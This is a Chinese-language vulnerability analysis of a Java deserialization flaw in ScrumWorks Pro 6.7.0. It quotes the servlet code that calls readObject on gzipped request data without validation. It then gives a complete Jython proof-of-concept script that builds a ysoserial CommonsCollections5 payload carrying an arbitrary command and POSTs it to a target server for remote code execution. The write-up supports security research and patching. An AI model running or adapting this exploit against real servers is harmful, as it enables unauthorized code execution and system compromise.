### ScrumWorks Pro 反序列化漏洞分析
#### 概述
国外安全人员发现ScrumWorks Pro 6.7.0版本中存在反序列化漏洞，成功利用该漏洞可导致任意代码执行。
>CollabNet ScrumWorks Pro is an Agile Project Management for Developers, Scrum Masters, and Business”. A trial version can be downloaded from the vendor: [https://www.collab.net/products/scrumworks](https://www.collab.net/products/scrumworks)

#### 漏洞原理
ScrumWorks Pro提供一个web接口可以通过Java Web Start (JNLP)启动java客户端程序，java客户端发送反序列化对象给服务端程序，服务端接收数据处理函数如下：

```
---
protected void doPost(HttpServletRequest paramHttpServletRequest, HttpServletResponse paramHttpServletResponse)
    throws IOException
  {
    ServerSession localServerSession = getSession(paramHttpServletRequest);
    
    AbstractExecutableCommand localAbstractExecutableCommand = null;
    ObjectInputStream localObjectInputStream = new ObjectInputStream(new GZIPInputStream(paramHttpServletRequest.getInputStream()));
    try
    {
      AbstractCommand localAbstractCommand = (AbstractCommand)localObjectInputStream.readObject();
      localAbstractExecutableCommand = (AbstractExecutableCommand)Class.forName(getExecutableCommandName(localAbstractCommand)).newInstance();
      
      paramHttpServletResponse.addHeader("X-SWP-responseType", "object");
      if (localServerSession.isExpired())
      {
        paramHttpServletRequest.getSession().invalidate();
        sendResponse(paramHttpServletResponse, new ReAuthenticateException());
        return;
      }
      localObject1 = ControllerUtils.extractUserFromAuthorizationHeader(paramHttpServletRequest);
      String str = localObject1 == null ? null : ((UserTO)localObject1).getUserName();
      LOGGER.info("[User: " + str + "] command: " + localAbstractCommand);
      if (Maintenance.isMaintenanceMode()) {
        sendResponse(paramHttpServletResponse, ServerException.getMaintenanceModeException());
      } else {
        runCommandIfAuthorized((UserTO)localObject1, localAbstractExecutableCommand, localAbstractCommand, paramHttpServletResponse);
      }
    }
    catch (ServerException localServerException)
    {
      localServerException.printStackTrace();
      sendResponse(paramHttpServletResponse, localServerException);
    }
    catch (InvalidClassException localInvalidClassException)
    {
      LOGGER.error("An outdated client tried to send a command.  Please log out and restart the client.");
      sendResponse(paramHttpServletResponse, new ServerException("The server has been updated.  Please relaunch your client.", localInvalidClassException));
    }
    catch (Exception localException)
    {
      LOGGER.debug("error handling request", localException);
      Object localObject1 = unwrapException(localException);
      LOGGER.error("error executing a command", (Throwable)localObject1);
      if (localAbstractExecutableCommand != null) {
        sendResponse(paramHttpServletResponse, ServerException.getMisconfiguredServerException((Exception)localObject1));
      }
    }
    finally
    {
      localObjectInputStream.close();
    }
  }
 
---
```

可以看到首先对数据进行了zip解码，然后使用ObjectInputStream的readObject读取反序列化对象，造成反序列化漏洞。而ScrumWorks使用了第三方库Apache CommonsCollections (3.2.1)，利用ysoserial生产payload即可利用该漏洞。

#### POC

```python
#
# Scrumworks Java Deserialization Remote Code Execution PoC
# 
import httplib
import urllib
import sys

import binascii

# load the ysoserial.jar file 
sys.path.append("./ysoserial.jar")

from ysoserial import *
from ysoserial.payloads import *

# ZIP support
from java.io import ByteArrayOutputStream
from java.io import ObjectOutputStream
from java.util.zip import GZIPOutputStream


print "Scrumworks Java Deserialization Remote Code Execution PoC"
print "========================================================="

if len(sys.argv) != 4:
  print "usage: " + sys.argv[0] + " host port command\n"  
  exit(3)

payloadName = "CommonsCollections5"
payloadClass = ObjectPayload.Utils.getPayloadClass(payloadName);

if payloadClass is None:
  print("Can't load ysoserial payload class")
  exit(2);

# serialize payload
payload = payloadClass.newInstance()
exploitObject = payload.getObject(sys.argv[3])

# create streams
byteStream = ByteArrayOutputStream()
zipStream = GZIPOutputStream(byteStream)
objectStream = ObjectOutputStream(zipStream) 
objectStream.writeObject(exploitObject)

# close streams
objectStream.flush()
objectStream.close()
zipStream.close()
byteStream.close()

# http request
print "sending serialized command"
conn = httplib.HTTPConnection(sys.argv[1] + ":" + sys.argv[2])
conn.request("POST", "/scrumworks/UFC-poc-", byteStream.toByteArray())
response = conn.getresponse()
conn.close()
print "done"
---
```

#### 参考
* https://blogs.securiteam.com/index.php/archives/3387
